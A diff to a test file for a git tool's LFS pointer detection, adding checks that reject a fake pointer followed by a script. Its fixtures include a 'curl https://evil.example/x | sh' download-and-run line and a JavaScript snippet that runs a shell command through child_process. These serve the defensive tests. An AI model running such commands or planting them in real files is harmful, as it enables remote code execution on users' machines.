@@ -1,6 +1,6 @@
 // Shared core for both tools: unstaged rename pairing (src/core/renames.ts) and what a side holds (src/core/hunks.ts).
 import { describe, expect, it } from 'vitest';
-import { isBinary, isLfsPointer } from '../../src/core/hunks.ts';
+import { isBinary, isLfsChange, isLfsPointer } from '../../src/core/hunks.ts';
 import { pairUnstagedRenames, RENAME_PAIRING } from '../../src/core/renames.ts';
 
 const enc = (t: string) => new TextEncoder().encode(t);
@@ -34,9 +34,31 @@ describe('what a side holds', () => {
     expect(isBinary(undefined)).toBe(false);
   });
 
-  it('LFS pointer: git-lfs version line, at most 1 KB', () => {
-    expect(isLfsPointer(enc('version https://git-lfs.github.com/spec/v1\noid sha256:x\nsize 1\n'))).toBe(true);
+  const OID = 'a'.repeat(64);
+  const pointer = `version https://git-lfs.github.com/spec/v1\noid sha256:${OID}\nsize 12345\n`;
+
+  it('LFS pointer: the complete git-lfs pointer and nothing else', () => {
+    expect(isLfsPointer(enc(pointer))).toBe(true);
+    expect(isLfsPointer(enc(`version https://git-lfs.github.com/spec/v1\next-0-foo sha256:${'b'.repeat(64)}\noid sha256:${OID}\nsize 0\n`))).toBe(true);
+    // The reproduced attack: the version line, then a script.
+    expect(isLfsPointer(enc('version https://git-lfs.github.com/spec/v1\ncurl https://evil.example/x | sh\n'))).toBe(false);
+    expect(isLfsPointer(enc(`${pointer}curl https://evil.example/x | sh\n`))).toBe(false);
+    expect(isLfsPointer(enc(pointer.replace(OID, 'abc')))).toBe(false); // short oid
+    expect(isLfsPointer(enc(pointer.replace(/\n$/, '')))).toBe(false); // last line unterminated
+    expect(isLfsPointer(enc(pointer.replace(/\n/g, '\r\n')))).toBe(false);
+    expect(isLfsPointer(enc(`size 1\n${pointer}`))).toBe(false);
     expect(isLfsPointer(enc('version https://git-lfs.github.com/spec/v2\n'))).toBe(false);
-    expect(isLfsPointer(enc(`version https://git-lfs.github.com/spec/v1\n${'x'.repeat(1100)}`))).toBe(false);
+  });
+
+  it('a change is LFS only when every side it has is a pointer', () => {
+    const p = enc(pointer);
+    const js = enc('module.exports = () => require("child_process").execSync("id");\n');
+    expect(isLfsChange(p, p)).toBe(true);
+    expect(isLfsChange(undefined, p)).toBe(true); // added
+    expect(isLfsChange(p, undefined)).toBe(true); // deleted
+    // The reproduced attack: a pointer replaced by arbitrary code.
+    expect(isLfsChange(p, js)).toBe(false);
+    expect(isLfsChange(js, p)).toBe(false);
+    expect(isLfsChange(undefined, undefined)).toBe(false);
   });
 });
